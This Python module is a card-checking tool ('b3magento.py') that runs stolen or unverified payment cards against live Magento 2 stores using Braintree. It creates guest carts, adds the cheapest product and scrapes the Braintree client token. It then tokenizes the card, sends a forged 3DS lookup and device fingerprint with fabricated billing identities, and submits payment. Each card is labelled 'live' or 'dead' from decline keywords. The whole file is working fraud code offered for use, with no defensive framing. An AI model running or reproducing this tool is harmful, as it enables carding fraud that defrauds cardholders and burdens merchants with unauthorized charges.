"""
b3magento.py — Braintree Magento 2 gateway checker.

Flow:
  1.  POST /rest/V1/guest-carts         -> masked_cart_id (cart token for REST API)
  2.  GET  /rest/V1/products            -> cheapest simple product  (sku + id)
       -- HTML scrape fallback if catalog API requires auth
  3.  POST /rest/V1/guest-carts/{id}/items -> add to cart
  4.  Fetch Braintree clientToken:
        a) GET /braintree/payment/clienttoken  (Magento controller action)
        b) GET /rest/V1/braintree/client-token (REST path variants)
        c) GET /checkout/ -> parse window.checkoutConfig (final fallback)
  5.  Decode clientToken (base64 JSON) -> authorizationFingerprint + merchantId
  6.  POST /rest/V1/guest-carts/{id}/estimate-shipping-methods -> carrier + method
  7.  POST /rest/V1/guest-carts/{id}/shipping-information      -> grand_total
  8.  POST payments.braintree-api.com/graphql  -> tokenize card (Bearer = fingerprint)
  9.  POST api.braintreegateway.com merchants/{id}/.../three_d_secure/lookup -> nonce
 10.  POST /rest/V1/guest-carts/{id}/payment-information -> final result

Returns {"status": "live"|"dead"|"unknown", "message": str, "amount": str, "card": str}
"""

import base64
import json
import re
import secrets

import requests

from .utils import (
    REQUEST_TIMEOUT,
    build_plain_session,
    convert_year,
    exc_msg,
    get_billing_identity,
    get_country_for_domain,
    random_ua,
    session_id,
)


# -- US State abbreviation -> Magento 2 region_id ----------------------------

_US_REGION_IDS: dict = {
    "AL": "1",  "AK": "2",  "AZ": "4",  "AR": "5",  "CA": "12",
    "CO": "13", "CT": "14", "DE": "16", "DC": "17", "FL": "18",
    "GA": "19", "HI": "21", "ID": "22", "IL": "23", "IN": "24",
    "IA": "25", "KS": "26", "KY": "27", "LA": "28", "ME": "29",
    "MD": "31", "MA": "32", "MI": "33", "MN": "34", "MS": "35",
    "MO": "36", "MT": "37", "NE": "38", "NV": "39", "NH": "40",
    "NJ": "41", "NM": "42", "NY": "43", "NC": "44", "ND": "45",
    "OH": "47", "OK": "48", "OR": "49", "PA": "51", "RI": "53",
    "SC": "54", "SD": "55", "TN": "56", "TX": "57", "UT": "58",
    "VT": "59", "VA": "61", "WA": "62", "WV": "63", "WI": "64",
    "WY": "65",
}


# -- Dead result keywords (decline messages) ---------------------------------

_DEAD_KEYWORDS = [
    "declined",
    "do not honor",
    "do not honour",
    "transaction refused",
    "security violation",
    "invalid card",
    "insufficient funds",
    "card has expired",
    "expired card",
    "security code",
    "fraud",
    "blocked",
    "call your bank",
    "contact your bank",
    "restricted card",
    "transaction not allowed",
    "card not supported",
    "lost or stolen",
    "card reported lost",
    "cvv2 failure",
    "cvv2",
    "account closed",
    "invalid account",
    "account suspended",
    "not permitted",
    "no such issuer",
    "pick up card",
    "possible stolen",
    "possible lost",
    "invalid account number",
    "processor declined",
    "payment declined",
    "card declined",
    "authorization failed",
    "avs",
    "honor with id",
    "not authorized",
    "gateway rejected",
    "card type not supported",
    "card number is invalid",
    "verification failed",
    "insufficient credit",
]


# -- Response classifier -----------------------------------------------------

def _classify(response_text: str, http_status: int, amount: str, card_str: str) -> dict:
    """Classify the response from POST /payment-information."""
    parsed = None
    try:
        parsed = json.loads(response_text)
    except Exception:
        pass

    # Magento returns the order increment ID (int or numeric string) on success
    if http_status == 200 and parsed is not None:
        if isinstance(parsed, int):
            return {"status": "live", "message": "Charged", "amount": amount, "card": card_str}
        if isinstance(parsed, str) and re.match(r"^\d+$", parsed.strip('"').strip()):
            return {"status": "live", "message": "Charged", "amount": amount, "card": card_str}
        if isinstance(parsed, dict) and (parsed.get("orderId") or parsed.get("order_id")):
            return {"status": "live", "message": "Charged", "amount": amount, "card": card_str}

    # Extract human-readable error message
    msg = ""
    if isinstance(parsed, dict):
        msg = parsed.get("message", "") or ""
        if not msg:
            params = parsed.get("parameters", [])
            if isinstance(params, list) and params:
                msg = " ".join(str(p) for p in params)
    if not msg:
        msg = response_text[:200]

    msg_clean = re.sub(r"<[^>]+>", " ", str(msg))
    msg_clean = re.sub(r"\s+", " ", msg_clean).strip()
    combined  = (msg_clean + " " + response_text).lower()

    for kw in _DEAD_KEYWORDS:
        if kw in combined:
            label = msg_clean[:120] or kw.title()
            return {"status": "dead", "message": label, "amount": amount, "card": card_str}

    short = msg_clean[:120] if msg_clean else "Unknown response"
    return {"status": "unknown", "message": short, "amount": amount, "card": card_str}


# -- Session warm-up (cookies + form_key) ------------------------------------

def _warm_session(session: requests.Session, domain: str, ua: str) -> tuple:
    """GET homepage to collect session cookies and extract form_key.
    Also probes for the active REST store-view prefix.
    Returns (form_key, rest_prefix) e.g. ('abc123', '/rest/default/V1').
    """
    form_key   = ""
    rest_prefix = "/rest/V1"
    for path in ("/", "/checkout/"):
        try:
            r = session.get(
                f"https://{domain}{path}",
                headers={"User-Agent": ua, "Accept": "text/html,*/*",
                         "Accept-Language": "en-US,en;q=0.9"},
                timeout=REQUEST_TIMEOUT,
            )
            html = r.text
            if not form_key:
                m = re.search(r'["\']form_key["\']\s*[,:]\s*["\']([^"\'\ ]{5,})["\']', html)
                if m:
                    form_key = m.group(1)
                if not form_key:
                    form_key = session.cookies.get("form_key", "")
            # Detect store-view from script URLs, e.g. /rest/default/V1 or /rest/en_US/V1
            if not rest_prefix or rest_prefix == "/rest/V1":
                m = re.search(r'/rest/([a-z]{2}(?:_[A-Z]{2})?|default)/V1/', html)
                if m:
                    rest_prefix = f"/rest/{m.group(1)}/V1"
        except Exception:
            pass
    return form_key, rest_prefix


# -- Guest cart creation with multi-prefix fallback ---------------------------

_REST_PREFIXES = [
    "/rest/V1",
    "/rest/default/V1",
    "/rest/all/V1",
    "/rest/en_US/V1",
    "/rest/en_GB/V1",
    "/rest/en/V1",
]


def _create_guest_cart(session: requests.Session, domain: str, ua: str,
                       preferred_prefix: str, json_hdrs: dict) -> tuple:
    """Try creating a guest cart across multiple REST prefixes.
    Returns (masked_id, working_prefix) or (None, None) on full failure.
    Also tries extracting masked_id from checkoutConfig as last resort.
    """
    base_url = f"https://{domain}"
    # Build ordered list: preferred prefix first, then the rest without duplicates
    prefixes = [preferred_prefix] + [p for p in _REST_PREFIXES if p != preferred_prefix]

    for prefix in prefixes:
        try:
            r = session.post(
                f"{base_url}{prefix}/guest-carts",
                json={},
                headers=json_hdrs,
                timeout=REQUEST_TIMEOUT,
            )
            if r.status_code == 401:
                # Auth required — this store will never work without credentials
                return None, "AUTH_REQUIRED"
            if r.status_code in (200, 201):
                masked_id = r.json()
                if isinstance(masked_id, str) and masked_id:
                    return masked_id, prefix
        except Exception:
            continue

    # Last resort: load checkout page and extract quoteData.entity_id or masked cart token
    try:
        r = session.get(
            f"{base_url}/checkout/",
            headers={"User-Agent": ua, "Upgrade-Insecure-Requests": "1"},
            timeout=REQUEST_TIMEOUT,
        )
        html = r.text
        # window.checkoutConfig.quoteData (Magento 2)
        m = re.search(
            r'["\']quoteData["\']\s*:\s*\{[^}]*["\']entity_id["\']\s*:\s*["\']?(\d+)["\']?',
            html,
        )
        if m:
            # entity_id is internal — but we can try to get a masked_id from the same
            # checkoutConfig block (it contains 'entityId' as masked token on some versions)
            pass
        # Try extracting 'cartId' or masked token from checkoutConfig JSON
        m = re.search(r'["\']cartId["\']\s*:\s*["\']([A-Za-z0-9]{20,})["\']', html)
        if m:
            return m.group(1), preferred_prefix
    except Exception:
        pass

    return None, None

def _discover_product(session: requests.Session, domain: str, ua: str):
    """Return (product_id_str, sku_str) for a purchasable simple product, or None."""

    # Magento 2 REST catalog API (public on most stores)
    try:
        r = session.get(
            f"https://{domain}/rest/V1/products",
            params={
                "searchCriteria[pageSize]": "10",
                "searchCriteria[sortOrders][0][field]": "price",
                "searchCriteria[sortOrders][0][direction]": "ASC",
                "searchCriteria[filter_groups][0][filters][0][field]": "type_id",
                "searchCriteria[filter_groups][0][filters][0][value]": "simple",
                "searchCriteria[filter_groups][0][filters][0][condition_type]": "eq",
                "searchCriteria[filter_groups][1][filters][0][field]": "status",
                "searchCriteria[filter_groups][1][filters][0][value]": "1",
                "searchCriteria[filter_groups][1][filters][0][condition_type]": "eq",
                "fields": "items[id,sku,type_id,status]",
            },
            headers={"User-Agent": ua, "Accept": "application/json"},
            timeout=REQUEST_TIMEOUT,
        )
        if r.status_code == 200:
            items = r.json().get("items", [])
            if items and items[0].get("id"):
                item = items[0]
                return str(item["id"]), item.get("sku", "")
    except Exception:
        pass

    # Fallback: HTML scraping for Magento 2 ATC data-post attributes
    for path in ("/", "/catalog/category/view/"):
        try:
            r = session.get(f"https://{domain}{path}", headers={"User-Agent": ua}, timeout=REQUEST_TIMEOUT)
            html = r.text
            # data-post JSON: {"action":"...","data":{"product":"ID",...}}
            m = re.search(r'"product"\s*:\s*"?(\d+)"?', html)
            if m:
                return m.group(1), ""
            # data-product-id or data-product_id
            m = re.search(r'data-product[-_]id=["\'](\d+)["\']', html)
            if m:
                return m.group(1), ""
        except Exception:
            continue

    return None


# -- Braintree clientToken fetcher -------------------------------------------

def _get_client_token(session: requests.Session, domain: str, ua: str) -> str:
    """Try several methods to obtain the Braintree clientToken. Returns '' on failure."""

    # Method 1: well-known Magento/Braintree controller & REST paths
    for path in (
        "/braintree/payment/clienttoken",
        "/rest/V1/braintree/client-token",
        "/rest/default/V1/braintree/client-token",
    ):
        try:
            r = session.get(
                f"https://{domain}{path}",
                headers={
                    "User-Agent":       ua,
                    "Accept":           "application/json, text/plain, */*",
                    "X-Requested-With": "XMLHttpRequest",
                },
                timeout=REQUEST_TIMEOUT,
            )
            if r.status_code == 200 and r.text.strip():
                raw = r.text.strip()
                try:
                    tok = json.loads(raw)
                    if isinstance(tok, str) and len(tok) > 40:
                        return tok
                except Exception:
                    plain = raw.strip('"')
                    if len(plain) > 40 and " " not in plain:
                        return plain
        except Exception:
            continue

    # Method 2: Load checkout page -> parse window.checkoutConfig
    try:
        r = session.get(
            f"https://{domain}/checkout/",
            headers={"User-Agent": ua, "Upgrade-Insecure-Requests": "1"},
            timeout=REQUEST_TIMEOUT,
        )
        # clientToken is a long base64 string; restrict charset to avoid false positives
        m = re.search(r'"clientToken"\s*:\s*"([A-Za-z0-9+/=]{40,})"', r.text)
        if m:
            return m.group(1)
    except Exception:
        pass

    return ""


# -- Main checker ------------------------------------------------------------

def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, **kwargs) -> dict:
    """Check one card against a Magento 2 + Braintree store."""

    cc, mm, yy, cvv = card_tuple
    yy       = convert_year(yy)
    mm       = mm.zfill(2)
    card_str = f"{cc}|{mm}|{yy}" + (f"|{cvv}" if cvv else "")
    ua       = random_ua()
    base_url = f"https://{domain}"

    # 0. Warm session — collect cookies, form_key, and REST store-view prefix
    form_key, rest_prefix = _warm_session(session, domain, ua)

    json_hdrs = {
        "User-Agent":        ua,
        "Accept":            "application/json",
        "Content-Type":      "application/json",
        "X-Requested-With":  "XMLHttpRequest",
        "Origin":            base_url,
        "Referer":           base_url + "/checkout/cart/",
    }

    # 1. Create guest cart (multi-prefix fallback)
    masked_id, working_prefix = _create_guest_cart(session, domain, ua, rest_prefix, json_hdrs)
    if not masked_id:
        return {"status": "unknown", "message": "Cart create failed (all REST paths failed)", "amount": "", "card": card_str}
    if working_prefix == "AUTH_REQUIRED":
        return {"status": "unknown", "message": "Cart create failed (store requires auth)", "amount": "", "card": card_str}
    # Use the prefix that worked for subsequent cart API calls
    rest_v1 = f"https://{domain}{working_prefix}"

    # 2. Discover product
    product = _discover_product(session, domain, ua)
    if not product:
        return {"status": "unknown", "message": "Could not find product on store", "amount": "", "card": card_str}
    product_id, product_sku = product

    # 3. Add to cart
    # — REST (SKU-based) when we have a real SKU; form-based fallback when SKU is empty
    atc_ok = False
    if product_sku:
        try:
            r = session.post(
                f"{rest_v1}/guest-carts/{masked_id}/items",
                json={"cartItem": {"quote_id": masked_id, "sku": product_sku, "qty": 1}},
                headers=json_hdrs,
                timeout=REQUEST_TIMEOUT,
            )
            if r.status_code in (200, 201):
                atc_ok = True
        except Exception as exc:
            return {"status": "unknown", "message": f"ATC error: {exc_msg(exc)}", "amount": "", "card": card_str}

    if not atc_ok:
        # Form-based ATC — works with product_id, no SKU needed
        try:
            form_data = {"product": product_id, "qty": "1", "form_key": form_key}
            r = session.post(
                f"{base_url}/checkout/cart/add/",
                data=form_data,
                headers={
                    "User-Agent":       ua,
                    "Content-Type":     "application/x-www-form-urlencoded",
                    "Referer":          f"{base_url}/",
                    "Origin":           base_url,
                },
                timeout=REQUEST_TIMEOUT,
                allow_redirects=True,
            )
            # Magento redirects to cart on success; response contains cart data
            if r.status_code in (200, 302) and ("checkout/cart" in str(r.url) or "cart" in r.text.lower()):
                atc_ok = True
            # Fallback: check if cart now has items via REST
            if not atc_ok:
                ck = session.get(
                    f"{rest_v1}/guest-carts/{masked_id}",
                    headers={"User-Agent": ua, "Accept": "application/json"},
                    timeout=REQUEST_TIMEOUT,
                )
                if ck.status_code == 200:
                    cart_data = ck.json()
                    if isinstance(cart_data, dict) and cart_data.get("items_count", 0) > 0:
                        atc_ok = True
        except Exception as exc:
            return {"status": "unknown", "message": f"ATC error: {exc_msg(exc)}", "amount": "", "card": card_str}

    if not atc_ok:
        return {"status": "unknown", "message": "Add to cart failed", "amount": "", "card": card_str}

    # 4. Fetch Braintree clientToken
    client_token_raw = _get_client_token(session, domain, ua)
    if not client_token_raw:
        return {"status": "unknown", "message": "Not a Braintree store (no clientToken)", "amount": "", "card": card_str}

    try:
        pad            = "=" * ((4 - len(client_token_raw) % 4) % 4)
        decoded        = json.loads(base64.b64decode(client_token_raw + pad))
        b3_fingerprint = decoded["authorizationFingerprint"]
        merchant_id    = decoded["merchantId"]
    except Exception as exc:
        return {"status": "unknown", "message": f"clientToken decode: {exc}", "amount": "", "card": card_str}

    # 5. Build billing identity
    ident      = get_billing_identity(domain)
    country    = ident.get("country") or get_country_for_domain(domain) or "US"
    state      = ident.get("state", "")
    state_full = ident.get("state_full", state)
    region_id  = ident.get("region_id", "") or (_US_REGION_IDS.get(state, "") if country == "US" else "")
    full_name  = f"{ident['fname']} {ident['lname']}"

    addr = {
        "street":     [ident["street"]],
        "city":       ident["city"],
        "region_id":  region_id,
        "region":     state_full,
        "country_id": country,
        "postcode":   ident["zip"],
        "firstname":  ident["fname"],
        "lastname":   ident["lname"],
        "company":    full_name,
        "telephone":  ident["phone"],
    }

    # 6. Estimate shipping
    carrier_code = "freeshipping"
    method_code  = "freeshipping"
    try:
        r = session.post(
            f"{rest_v1}/guest-carts/{masked_id}/estimate-shipping-methods",
            json={"address": addr},
            headers=json_hdrs,
            timeout=REQUEST_TIMEOUT,
        )
        if r.status_code == 200:
            methods = r.json()
            if isinstance(methods, list) and methods:
                carrier_code = methods[0].get("carrier_code", "freeshipping")
                method_code  = methods[0].get("method_code",  "freeshipping")
    except Exception:
        pass

    # 7. Set shipping -> get order total
    amount = ""
    try:
        r = session.post(
            f"{rest_v1}/guest-carts/{masked_id}/shipping-information",
            json={
                "addressInformation": {
                    "shipping_address":      addr,
                    "billing_address":       addr,
                    "shipping_method_code":  method_code,
                    "shipping_carrier_code": carrier_code,
                    "extension_attributes":  {},
                }
            },
            headers=json_hdrs,
            timeout=REQUEST_TIMEOUT,
        )
        if r.status_code == 200:
            totals = r.json()
            if isinstance(totals, dict):
                grand = (
                    (totals.get("totals") or {}).get("grand_total")
                    or (totals.get("totals") or {}).get("base_grand_total")
                    or totals.get("grand_total")
                    or totals.get("base_grand_total")
                )
                if grand:
                    amount = f"${grand}"
    except Exception:
        pass

    amount_numeric = amount.replace("$", "").replace(",", "").strip() or "1.00"

    # 8. Tokenize card via Braintree GraphQL
    bt_token = ""
    try:
        r = build_plain_session().post(
            "https://payments.braintree-api.com/graphql",
            json={
                "clientSdkMetadata": {
                    "source":      "client",
                    "integration": "custom",
                    "sessionId":   session_id(),
                },
                "query": (
                    "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {"
                    "  tokenizeCreditCard(input: $input) {"
                    "    token"
                    "    creditCard { bin brandCode last4 expirationMonth expirationYear"
                    "      binData { prepaid healthcare debit durbinRegulated commercial"
                    "               payroll issuingBank countryOfIssuance productId } }"
                    "  }"
                    "}"
                ),
                "variables": {
                    "input": {
                        "creditCard": {
                            "number":          cc,
                            "expirationMonth": mm,
                            "expirationYear":  yy,
                            "cvv":             cvv or "",
                        },
                        "options": {"validate": False},
                    }
                },
                "operationName": "TokenizeCreditCard",
            },
            headers={
                "Accept":            "*/*",
                "Authorization":     f"Bearer {b3_fingerprint}",
                "Braintree-Version": "2018-05-10",
                "Content-Type":      "application/json",
                "Origin":            "https://assets.braintreegateway.com",
                "Referer":           "https://assets.braintreegateway.com/",
                "User-Agent":        ua,
            },
            timeout=REQUEST_TIMEOUT,
        )
        bt_data  = r.json()
        bt_token = (
            bt_data.get("data", {})
                   .get("tokenizeCreditCard", {})
                   .get("token", "")
        )
    except Exception as exc:
        return {"status": "unknown", "message": f"BT tokenize error: {exc}", "amount": amount, "card": card_str}

    if not bt_token:
        return {"status": "unknown", "message": "BT tokenize: no token returned", "amount": amount, "card": card_str}

    # 9. Braintree 3DS lookup (upgrades token to a nonce; non-fatal)
    nonce = bt_token
    try:
        r = build_plain_session().post(
            f"https://api.braintreegateway.com/merchants/{merchant_id}"
            f"/client_api/v1/payment_methods/{bt_token}/three_d_secure/lookup",
            json={
                "amount":       amount_numeric,
                "additionalInfo": {
                    "billingLine1":       ident["street"],
                    "billingCity":        ident["city"],
                    "billingState":       state,
                    "billingPostalCode":  ident["zip"],
                    "billingCountryCode": country,
                    "billingPhoneNumber": ident["phone"],
                    "billingGivenName":   ident["fname"],
                    "billingSurname":     ident["lname"],
                },
                "dfReferenceId":  f"1_{secrets.token_hex(16)}",
                "clientMetadata": {
                    "requestedThreeDSecureVersion":           "2",
                    "sdkVersion":                             "web/3.79.1",
                    "cardinalDeviceDataCollectionTimeElapsed": 625,
                },
                "authorizationFingerprint": b3_fingerprint,
                "braintreeLibraryVersion":  "braintree/web/3.79.1",
                "_meta": {
                    "merchantAppId":   domain,
                    "platform":        "web",
                    "sdkVersion":      "3.79.1",
                    "source":          "client",
                    "integration":     "custom",
                    "integrationType": "custom",
                    "sessionId":       session_id(),
                },
            },
            headers={
                "Accept":            "*/*",
                "Content-Type":      "application/json",
                "User-Agent":        ua,
                "X-Requested-With":  "XMLHttpRequest",
            },
            timeout=REQUEST_TIMEOUT,
        )
        if r.status_code == 200:
            data = r.json()
            got  = (
                data.get("nonce")
                or (data.get("paymentMethod") or {}).get("nonce")
                or ""
            )
            if got:
                nonce = got
    except Exception:
        pass  # 3DS failure is non-fatal; proceed with original token

    # 10. Submit payment
    billing_addr = {
        "countryId":         country,
        "regionId":          region_id,
        "regionCode":        state,
        "region":            state_full,
        "street":            [ident["street"]],
        "company":           full_name,
        "telephone":         ident["phone"],
        "postcode":          ident["zip"],
        "city":              ident["city"],
        "firstname":         ident["fname"],
        "lastname":          ident["lname"],
        "saveInAddressBook": None,
    }
    device_data = json.dumps({
        "device_session_id": secrets.token_hex(16),
        "fraud_merchant_id": "null",
    })

    try:
        r = session.post(
            f"{rest_v1}/guest-carts/{masked_id}/payment-information",
            json={
                "cartId": masked_id,
                "billingAddress": billing_addr,
                "paymentMethod": {
                    "method": "braintree",
                    "additional_data": {
                        "payment_method_nonce":            nonce,
                        "device_data":                     device_data,
                        "is_active_payment_token_enabler": True,
                    },
                    "extension_attributes": {"agreement_ids": []},
                },
                "email": ident["email"],
            },
            headers=json_hdrs,
            timeout=REQUEST_TIMEOUT,
        )
        return _classify(r.text, r.status_code, amount, card_str)
    except Exception as exc:
        return {"status": "unknown", "message": f"Payment submit: {exc}", "amount": amount, "card": card_str}
